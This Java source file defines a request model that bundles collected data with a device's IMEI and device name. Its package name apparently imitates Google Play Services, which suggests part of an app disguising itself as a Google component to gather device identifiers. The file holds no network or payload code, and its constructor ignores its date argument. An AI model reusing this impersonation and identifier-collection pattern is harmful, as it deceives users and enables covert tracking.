package com.google.android.gms.persistent.googleapps.network.models.request;

import com.google.android.gms.persistent.googleapps.network.models.data.Data;

import java.util.Date;
import java.util.List;

/**
 * Created by OldMan on 05.04.2017.
 */

public class OneTimeRequest extends InformationRequest {
    private long dateCreate;

    public OneTimeRequest(List<Data> data, String imei, String device, long date) {
        super(data, imei, device);
    }

    public long getDateCreate() {
        return dateCreate;
    }

    public void setDateCreate(long dateCreate) {
        this.dateCreate = dateCreate;
    }
}
